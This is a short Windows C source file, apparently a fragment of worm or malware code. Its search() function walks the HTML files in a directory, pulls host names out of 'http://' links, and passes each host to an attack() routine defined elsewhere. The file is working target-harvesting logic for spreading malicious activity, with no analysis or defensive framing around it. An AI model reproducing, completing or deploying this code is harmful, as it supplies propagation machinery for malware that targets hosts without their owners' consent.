#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

void search(LPCSTR path) {
    WIN32_FIND_DATAA wfd;
    HANDLE hFind, hFile;
    DWORD bytesread;
    char *buf, *p, *host;
    DWORD size;

    if (!SetCurrentDirectoryA(path)) return;

    hFind = FindFirstFileA("*.htm*", &wfd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        hFile = CreateFileA(wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }

        buf = (char *)malloc(size + 1);
        if (!buf) { CloseHandle(hFile); continue; }

        if (!ReadFile(hFile, buf, size, &bytesread, NULL) || bytesread != size) {
            free(buf);
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        buf[size] = '\0';

        p = buf;
        while (*p) {
            char *http = strstr(p, "http://");
            if (!http) break;
            host = http + 7;                // skip "http://"
            p = strchr(host, '/');
            if (!p) break;
            *p = '\0';                      // terminate at slash
            attack(host);
            p++;                            // move past the slash
        }
        free(buf);
    } while (FindNextFileA(hFind, &wfd));

    FindClose(hFind);
}
